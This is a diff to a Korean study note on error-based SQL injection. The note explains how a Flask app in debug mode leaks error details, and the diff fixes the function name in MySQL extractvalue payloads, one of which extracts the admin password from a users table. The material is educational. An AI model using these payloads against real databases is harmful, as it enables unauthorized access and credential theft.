@@ -4,11 +4,11 @@
 임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법이다. 
 #### 공격방법
 Flask 프레임워크로 개발된 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생할 때 발생 원인을 출력하는 것을 이용해서, 다양한 정보를 수집하고, 원하는 데이터를 획득한다.
-* extravalue 함수
+* extractvalue 함수
 첫 번째로 전달된 XML데이터에서 두 번째 인자인 XPATH식을 통해 데이터를 추출한다. 만약 두 번째 XPATH식이 올바르지 않을 경우 에러 메시지와 잘못된 식을 출력한다. 
 ```sql
-SELECT extravalue(1, concat(0x3a, version()));
-SELECT extravalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));
+SELECT extractvalue(1, concat(0x3a, version()));
+SELECT extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));
 ```
 * updatexml
 ``` sql
